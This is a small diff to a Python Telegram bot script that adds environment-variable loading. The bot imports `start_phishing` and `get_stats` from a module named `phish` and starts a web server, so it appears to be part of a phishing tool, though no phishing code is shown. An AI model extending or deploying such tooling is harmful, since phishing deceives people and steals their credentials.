@@ -1,14 +1,14 @@
 import logging
+from dotenv import load_dotenv 
+load_dotenv()
 from telegram import Update
 from telegram.ext import Application, CommandHandler, ContextTypes, MessageHandler, filters
 import json
 import os
 from const import BOT_TOKEN, USER_DATA_FILE
 from phish import start_phishing, get_stats
-
 # ✅ Import web server
 from webserver import start_server
-
 # Set up logging
 logging.basicConfig(
     format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
